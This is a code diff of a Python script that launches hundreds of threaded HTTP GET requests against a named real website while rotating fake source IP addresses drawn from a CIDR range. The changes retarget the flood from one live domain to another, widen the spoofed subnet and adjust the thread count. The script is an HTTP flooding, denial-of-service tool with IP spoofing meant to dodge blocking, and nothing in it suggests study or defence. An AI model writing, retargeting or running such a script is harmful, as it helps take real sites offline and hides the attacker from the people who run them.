@@ -4,11 +4,11 @@ import threading
 import ipaddress
 
 # Define the target server and port
-target = "tipistream.tipikuy.workers.dev"
+target = "doujindesu.tv"
 port = 80  # HTTP typically uses port 80
 
 # Define the CIDR subnet range
-subnet = ipaddress.IPv4Network('115.66.0.0/16', strict=False)
+subnet = ipaddress.IPv4Network('114.120.0.0/13', strict=False)
 
 # Define a list of fake IP addresses
 fake_ips = ["20.205.61.143", "103.84.206.169", "101.37.18.10"]
@@ -22,7 +22,7 @@ def generate_fake_ips(subnet, count):
     return fake_ips
 
 # Generate fake IPs within the CIDR range
-generated_fake_ips = generate_fake_ips(subnet, 100)  # Generate 10 fake IPs
+generated_fake_ips = generate_fake_ips(subnet, 109)  
 
 # Function to send HTTP GET requests with a random fake IP
 def send_request_with_random_fake_ip():
@@ -42,7 +42,7 @@ def send_request_with_random_fake_ip():
 
 # Create and start threads for sending requests
 threads = []
-for _ in range(3105):
+for _ in range(500):
     thread = threading.Thread(target=send_request_with_random_fake_ip)
     thread.start()
     threads.append(thread)
